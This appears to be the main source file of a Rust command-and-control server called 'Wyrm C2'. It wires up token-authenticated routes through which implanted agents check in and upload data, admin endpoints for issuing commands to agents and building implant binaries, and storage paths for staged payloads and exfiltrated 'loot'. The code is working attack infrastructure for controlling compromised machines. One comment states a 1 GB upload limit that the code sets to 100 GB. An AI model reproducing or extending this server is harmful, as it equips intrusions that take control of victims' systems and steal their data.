#![feature(map_try_insert)]

use core::panic;
use std::{net::SocketAddr, panic::set_hook, sync::Arc, time::Duration};

use axum::{
    Router,
    extract::DefaultBodyLimit,
    middleware::from_fn_with_state,
    routing::{get, post},
    serve,
};

use shared::{
    net::{
        ADMIN_ENDPOINT, ADMIN_HEALTH_CHECK_ENDPOINT, ADMIN_LOGIN_ENDPOINT,
        NOTIFICATION_CHECK_AGENT_ENDPOINT,
    },
    pretty_print::{print_info, print_success},
};

use crate::{
    api::{
        admin_routes::{
            admin_login, build_all_binaries_handler, handle_admin_commands_on_agent,
            handle_admin_commands_without_agent, is_adm_logged_in, logout,
            poll_agent_notifications,
        },
        agent_get::{handle_agent_get, handle_agent_get_with_path},
        agent_post::{handle_agent_post, handle_agent_post_with_path},
    },
    app_state::{AppState, detect_stale_agents},
    db::Db,
    logging::log_error,
    middleware::{authenticate_admin, authenticate_agent_by_header_token, logout_middleware},
    profiles::parse_profile,
};

mod admin_task_dispatch;
mod agents;
mod api;
mod app_state;
mod db;
mod exfil;
mod logging;
mod middleware;
mod net;
mod pe_utils;
mod profiles;

/// The maximum POST body request size that can be received by the C2.
/// Set at 1 GB.
const NUM_GIGS: usize = 100;
const MAX_POST_BODY_SZ: usize = NUM_GIGS * 1024 * 1024 * 1024;

const AUTH_COOKIE_NAME: &str = "session";
const COOKIE_TTL: Duration = Duration::from_hours(12);

/// The path to the directory on the server (relative to the working directory of the service [n.b. this
/// implies the server was 'installed' correctly..])
const FILE_STORE_PATH: &str = "/data/staged_files";
const EXFIL_PATH: &str = "/data/loot";
const LOG_PATH: &str = "/data/logs";
const DB_EXPORT_PATH: &str = "/data/exports";
const ACCESS_LOG: &str = "access.log";
const DOWNLOAD: &str = "downloads.log";
const LOGIN_LOG: &str = "login.log";
const ERROR_LOG: &str = "error.log";

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    //
    // Initialise the state of the C2, including checking the filesystem, database, etc.
    //
    let state = init_server_state().await;

    //
    // Build the router and serve content
    //
    let app = build_routes(state.clone());
    let listener = tokio::net::TcpListener::bind(construct_listener_addr()).await?;

    print_success(format!(
        "Wyrm C2 started on: {}",
        listener.local_addr().unwrap()
    ));

    serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await?;

    print_info("Server closed.");

    Ok(())
}

fn construct_listener_addr() -> String {
    let port = std::env::var("C2_PORT").expect("could not find C2_PORT environment variable");
    let port: u16 = port
        .parse()
        .expect("could not parse port number to valid range");
    let c2_host = std::env::var("C2_HOST").expect("could not find C2_HOST environment variable");

    format!("{c2_host}:{port}")
}

async fn init_server_state() -> Arc<AppState> {
    print_info("Starting Wyrm C2.");

    let profile = match parse_profile().await {
        Ok(p) => p,
        Err(e) => {
            panic!("Could not parse profiles. {e}");
        }
    };

    print_success("Profiles parsed.");

    set_panic_hook();
    ensure_dirs_and_files();

    let pool = Db::new().await;
    let state = Arc::new(AppState::from(pool, profile).await);

    //
    // Kick off automations that run on the server
    //
    state.track_sessions();
    let state_cl = state.clone();
    tokio::task::spawn(async move { detect_stale_agents(state_cl).await });

    state
}

fn build_routes(state: Arc<AppState>) -> Router {
    Router::new()
        //
        //
        // PUBLIC ROUTES
        //
        //
        .route(
            "/",
            get(handle_agent_get).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        .route(
            "/",
            post(handle_agent_post).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        // Used for the operator staging payloads or check-ins not to /
        .route(
            "/{*endpoint}",
            get(handle_agent_get_with_path).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        .route(
            "/{*endpoint}",
            post(handle_agent_post_with_path).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        //
        //
        // ADMIN ROUTES
        //
        //
        .route(
            "/logout_admin",
            post(logout).layer(from_fn_with_state(state.clone(), logout_middleware)),
        )
        // Build all binaries path
        .route(
            "/admin_bab",
            post(build_all_binaries_handler)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        .route(&format!("/{ADMIN_LOGIN_ENDPOINT}"), post(admin_login))
        // Admin endpoint when operating a command which is not related to a specific agent
        .route(
            &format!("/{ADMIN_ENDPOINT}"),
            post(handle_admin_commands_without_agent)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        // Against a specific agent
        .route(
            &format!("/{ADMIN_ENDPOINT}/{}", "{id}"),
            post(handle_admin_commands_on_agent)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        // For checking if notifications exist for a given agent
        .route(
            &format!("/{NOTIFICATION_CHECK_AGENT_ENDPOINT}/{}", "{id}"),
            get(poll_agent_notifications)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        // A route for admin poll to check if logged in on the GUI
        .route(
            ADMIN_HEALTH_CHECK_ENDPOINT,
            get(is_adm_logged_in).layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        //
        // 1 GB for POST max ?
        //
        .layer(DefaultBodyLimit::max(MAX_POST_BODY_SZ))
        .with_state(state.clone())
}

fn ensure_dirs_and_files() {
    create_dir!(FILE_STORE_PATH);
    create_dir!(DB_EXPORT_PATH);
    create_dir!(EXFIL_PATH);
    create_dir!(LOG_PATH);

    ensure_log_file_on_disk!(ACCESS_LOG);
    ensure_log_file_on_disk!(DOWNLOAD);
    ensure_log_file_on_disk!(LOGIN_LOG);
    ensure_log_file_on_disk!(ERROR_LOG);

    print_success("Directories and files are in order..");
}

/// Installs a custom panic handler that logs panics to the a log file in `/data/logs/error.log`.
fn set_panic_hook() {
    set_hook(Box::new(|panic_info| {
        let payload = panic_info
            .payload()
            .downcast_ref::<&str>()
            .map(|s| *s)
            .or_else(|| {
                panic_info
                    .payload()
                    .downcast_ref::<String>()
                    .map(String::as_str)
            })
            .unwrap_or("Unknown panic payload");

        let location = panic_info
            .location()
            .map(|loc| format!("{}:{}", loc.file(), loc.line()))
            .unwrap_or_else(|| "Unknown location".to_string());

        log_error(&format!("PANIC at {}: `{}`", location, payload));
    }));
}
